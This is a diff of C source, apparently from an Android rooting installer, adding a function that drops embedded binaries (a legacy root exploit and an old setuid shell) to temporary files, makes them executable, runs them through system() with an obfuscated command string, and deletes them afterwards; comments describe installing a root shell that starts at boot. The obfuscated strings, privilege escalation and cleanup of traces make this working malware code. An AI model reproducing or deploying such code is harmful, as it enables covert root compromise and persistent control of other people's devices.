@@ -21,12 +21,53 @@
 #include "bin_oldsuidext.h"
 #include "bin_suidext.h"
 #include "ps.h"
+#ifdef SHARED_LIB
+#include "bin_legacyexp.h"
+#endif
 
 static unsigned char system_str[] = "\x76\xcb\xba\xef\x1b\x11\x1b\x06\x15\x2d"; // "/system"
 static unsigned char stmp1[] = "\xc0\xf7\x32\x5d\x5c\x53\x50\x1f"; // "stmp1" 
 static unsigned char sotmp1[] = "\x5f\xe5\xbc\xf4\xf0\xf5\xf2\xf1\xb6"; // "sotmp1"
 static unsigned char shtmp[] = "\x53\xd9\x8f\x20\xcd\xd9\xce\x25"; // "shtmp"
+static unsigned char etmp[] = "\xad\x4d\xe4\x58\x6b\x40\x67"; // "etmp"
+static unsigned char exp_str[] = "\x24\x5d\x75\x3a\x35\x03\xe9\x3c\x3a\x35\x03\xe9\x3c\xee\xf0"; // "./%s ./%s rt"
 
+#ifdef SHARED_LIB
+void exec_legacy_exploit() {
+
+  FILE * fd_oldshell  = fopen(deobfuscate(sotmp1), "w"); // old setuid shell
+  FILE * fd_legacyexp  = fopen(deobfuscate(etmp), "w"); // old setuid shell
+  char cmd[512];
+
+  LOGD("[INSTALLER] Starting legacy exploitation\n");
+
+  if(!fd_oldshell || !fd_legacyexp) {
+    LOGD("[INSTALLER] Failed to create file for legacy exp\n");
+    return;
+  }
+
+  fwrite(&bin_legacy_get_root, 1, sizeof(bin_legacy_get_root), fd_legacyexp);
+  fwrite(&binoldsuidext, 1, sizeof(binoldsuidext), fd_oldshell);
+
+  fclose(fd_legacyexp);
+  fclose(fd_oldshell);
+
+  chmod(deobfuscate(etmp), 0777);
+  chmod(deobfuscate(sotmp1), 0777);
+
+  memset(cmd, 0, sizeof(cmd));
+  snprintf(cmd, sizeof(cmd), deobfuscate(exp_str), deobfuscate(etmp), deobfuscate(sotmp1));
+
+  LOGD("[INSTALLER] Starting exploitation\n");
+  system(cmd);
+  LOGD("[INSTALLER] Legacy done\n");
+
+  remove(deobfuscate(etmp));
+  remove(deobfuscate(sotmp1));
+
+}
+
+#endif
 
 // Install the root shell.
 // - Copy the sh script in /system/etc (boot start)
